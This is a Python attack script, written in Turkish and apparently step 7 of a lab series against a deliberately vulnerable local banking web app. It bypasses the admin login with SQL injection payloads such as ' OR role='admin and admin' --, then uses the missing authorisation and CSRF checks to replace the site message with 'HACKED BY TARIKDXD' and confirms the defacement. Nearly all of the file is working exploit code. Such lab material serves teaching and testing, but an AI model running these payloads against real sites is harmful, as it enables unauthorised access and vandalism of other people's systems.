"""
ADIM 7: Site Deface - "HACKED BY TARIKDXD"
=============================================
Zafiyet: Admin panelinde yetki kontrolu yok.
         Site mesaji POST ile degistirilebiliyor (CSRF yok).
Hedef:  Site mesajini "HACKED BY TARIKDXD" yapmak.
        Kullanici ana sayfaya girdiginde hacked mesajini gormesi.

Calistirma:  python 07-deface.py
"""

import requests

HEDEF = "http://localhost:5000"

print("""
[ADIM 7] SITE DEFACE - HACKED BY TARIKDXD
--------------------------------------------""")

s = requests.Session()
# SQLi ile giris yap
data = {"username": "' OR role='admin", "password": "x"}
r = s.post(f"{HEDEF}/", data=data, allow_redirects=False)
if r.status_code == 302:
    print("[OK] Admin olarak giris yapildi (SQLi ile)!")
else:
    print("[HATA] Admin giris basarisiz, deneme yapiliyor...")
    data = {"username": "admin' --", "password": "x"}
    r = s.post(f"{HEDEF}/", data=data, allow_redirects=False)
    if r.status_code != 302:
        print("[HATA] Admin giris basarisiz")
        exit(1)
    print("[OK] Admin giris basarili!")

print("\n[ADIM 7.1] Admin paneline eris")
r = s.get(f"{HEDEF}/admin")
if "Admin Paneli" in r.text or "Kullanicilar" in r.text:
    print("[OK] Admin paneline erisildi!")
else:
    print("[HATA] Admin paneline erisilemedi")
    exit(1)

print("\n[ADIM 7.2] Site mesajini degistir: HACKED BY TARIKDXD")
r = s.post(f"{HEDEF}/admin", data={
    "site_mesaji": "HACKED BY TARIKDXD"
}, allow_redirects=False)

if r.status_code in [200, 302]:
    print("[OK] Site mesaji basariyla degistirildi!")
else:
    print("[HATA] Mesaj degistirilemedi")
    exit(1)

print("\n[ADIM 7.3] Ana sayfada degisikligi kontrol et (oturum acmadan)")
r = requests.get(f"{HEDEF}/")
if "HACKED BY TARIKDXD" in r.text:
    print("[OK] Ana sayfada 'HACKED BY TARIKDXD' goruntulendi!")
    print("[+] SITE BASARIYLA HACKLENDI!")
else:
    print("[HATA] Degisiklik goruntulenemedi")
    print(f"  Mevcut mesaj: {r.text[1000:1200]}")

print("\n[ADIM 7.4] Deface sayfasini goster")
print("[INFO] /deface sayfasina yonlendiriliyor...")
r = requests.get(f"{HEDEF}/deface")
if "HACKED BY TARIKDXD" in r.text:
    print("[OK] Deface sayfasi hazir!")

print("\n" + "="*50)
print("SALDIRI OZETI:")
print("1. SQL Injection -> Admin paneline erisim")
print("2. Admin panelinde yetki kontrolu YOK -> herkes gorebilir")
print("3. Site mesaji POST ile degistirilebiliyor (CSRF yok)")
print("4. Tum kullanicilar ana sayfada hacked mesajini goruyor")
print("5. Site tamamen deface edildi!")
print("="*50)

print("\n[MANUEL] Tarayicida su adrese git:")
print("  http://localhost:5000/")
print("  http://localhost:5000/deface")
print()
print("[COZUM] Siteyi geri almak icin:")
print("  Admin paneline git -> Site mesaji'ni duzelt")
print("  veya: rm bank.db && python database.py && python app.py")
